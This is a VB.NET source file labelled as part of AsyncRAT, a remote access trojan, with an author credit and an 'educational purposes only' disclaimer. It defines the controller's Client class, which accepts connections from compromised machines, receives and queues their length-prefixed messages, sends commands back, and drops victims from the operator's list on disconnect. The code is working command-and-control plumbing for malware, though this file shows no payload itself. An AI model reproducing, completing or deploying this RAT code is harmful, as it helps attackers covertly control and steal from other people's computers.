Imports System.IO
Imports System.Net.Sockets

'       │ Author     : NYAN CAT
'       │ Name       : AsyncRAT

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program is distributed for educational purposes only.

Public Class Client

    Public C As Socket = Nothing
    Public IsConnected As Boolean = False
    Public BufferLength As Long = Nothing
    Public Buffer() As Byte = Nothing
    Public MS As MemoryStream = Nothing
    Public IP As String = Nothing
    Public L As ListViewItem = Nothing

    Sub New(ByVal CL As Socket)
        C = CL
        C.ReceiveBufferSize = 1024 * 500
        C.SendBufferSize = 1024 * 500
        IsConnected = True
        BufferLength = -1
        Buffer = New Byte(0) {}
        MS = New MemoryStream
        IP = CL.RemoteEndPoint.ToString

        C.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), C)
    End Sub

    Async Sub BeginReceive(ByVal ar As IAsyncResult)
        If IsConnected = False Then isDisconnected()
        Try
            Dim Received As Integer = C.EndReceive(ar)
            If Received > 0 Then
                If BufferLength = -1 Then
                    If Buffer(0) = 0 Then
                        BufferLength = BS(MS.ToArray)
                        MS.Dispose()
                        MS = New MemoryStream

                        If BufferLength = 0 Then
                            BufferLength = -1
                            C.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), C)
                            Exit Sub
                        End If
                        Buffer = New Byte(BufferLength - 1) {}
                    Else
                        MS.WriteByte(Buffer(0))
                    End If
                Else
                    Await MS.WriteAsync(Buffer, 0, Received)
                    If (MS.Length = BufferLength) Then
                        Dim ClientReq As New Incoming_Requests(Me, MS.ToArray)
                        Pending.Req_In.Add(ClientReq)
                        BufferLength = -1
                        MS.Dispose()
                        MS = New MemoryStream
                        Buffer = New Byte(0) {}
                    Else
                        Buffer = New Byte(BufferLength - MS.Length - 1) {}
                    End If
                End If
            Else
                isDisconnected()
            End If
            C.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), C)
        Catch ex As Exception
            isDisconnected()
        End Try
    End Sub

    Sub Send(ByVal b As Byte())
        Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf BeginSend), b)
    End Sub

    Async Sub BeginSend(ByVal b As Byte())
        Try
            Using MS As New MemoryStream
                Dim L As Byte() = SB(b.Length & CChar(vbNullChar))
                Await MS.WriteAsync(L, 0, L.Length)
                Await MS.WriteAsync(b, 0, b.Length)

                C.Poll(-1, SelectMode.SelectWrite)
                C.Send(MS.ToArray, 0, MS.Length, SocketFlags.None)
            End Using
        Catch ex As Exception
            isDisconnected()
        End Try
    End Sub

    Sub EndSend(ByVal ar As IAsyncResult)
        Try
            C.EndSend(ar)
        Catch ex As Exception
        End Try
    End Sub

    Delegate Sub _isDisconnected()
    Sub isDisconnected()

        IsConnected = False

        Try
            If Messages.F.InvokeRequired Then
                Messages.F.Invoke(New _isDisconnected(AddressOf isDisconnected))
                Exit Sub
            Else
                L.Remove()
            End If
        Catch ex As Exception
        End Try

        Try
            C.Close()
            C.Dispose()
        Catch ex As Exception
        End Try

        Try
            MS.Dispose()
        Catch ex As Exception
        End Try

    End Sub

End Class
